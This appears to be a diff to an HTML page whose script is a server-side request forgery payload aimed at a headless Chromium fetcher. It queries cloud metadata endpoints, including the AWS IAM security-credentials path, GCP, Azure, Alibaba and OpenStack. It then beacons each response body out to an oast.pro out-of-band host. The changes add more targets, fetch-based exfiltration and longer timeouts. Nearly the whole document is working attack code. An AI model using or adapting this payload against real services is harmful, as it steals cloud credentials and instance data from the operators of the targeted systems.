@@ -3,29 +3,33 @@
 <head><title>t</title></head>
 <body>
 <script>
-var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
+var OOB = 'd9qp7kj6b8mduf5mnh3gf5w85bm65a1gq.oast.pro';
 var T0 = Date.now();
 
 function fire(path) {
-  new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
+  new Image().src = 'http://' + OOB + path + '&r=' + Math.random();
+  fetch('http://' + OOB + path + '&r=' + Math.random(), {mode:'no-cors'}).catch(function(){});
 }
 
 // Alive
-fire('/alive2?ms=0&ua=' + encodeURIComponent(navigator.userAgent.slice(0, 80)));
+fire('/alive3?ms=0&ua=' + encodeURIComponent(navigator.userAgent.slice(0, 80)));
 
-// 169.254.169.254 focused probes — short timeout 80ms to fit in page lifetime
+// 169.254.169.254 focused probes — timeout 5000ms for Chromium fetcher
 var ll_targets = [
   ['imds-root',  'http://169.254.169.254/'],
   ['imds-meta',  'http://169.254.169.254/latest/meta-data/'],
   ['imds-iam',   'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
+  ['imds-gcp',   'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json'],
   ['imds-yc',    'http://169.254.169.254/computeMetadata/v1/project/project-id'],
-  ['imds-169',   'http://169.254.169.254/openstack/latest/meta_data.json'],
+  ['imds-az',    'http://169.254.169.254/metadata/instance?api-version=2021-02-01'],
+  ['imds-ali',   'http://100.100.100.200/latest/meta-data/'],
+  ['imds-os',    'http://169.254.169.254/openstack/latest/meta_data.json'],
 ];
 
 ll_targets.forEach(function(t) {
   var label = t[0], url = t[1];
   var t0 = Date.now();
-  fetch(url, {signal: AbortSignal.timeout(80)})
+  fetch(url, {signal: AbortSignal.timeout(5000)})
     .then(function(r) {
       return r.text().then(function(body) {
         fire('/OK-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 400)));
@@ -38,7 +42,7 @@ ll_targets.forEach(function(t) {
 
 // Also try XHR (different PNA handling than fetch in some Chromium builds)
 var xhr = new XMLHttpRequest();
-xhr.timeout = 80;
+xhr.timeout = 5000;
 xhr.onload = function() {
   fire('/OK-xhr-imds?ms=' + (Date.now()-T0) + '&s=' + xhr.status + '&d=' + encodeURIComponent(xhr.responseText.slice(0,400)));
 };
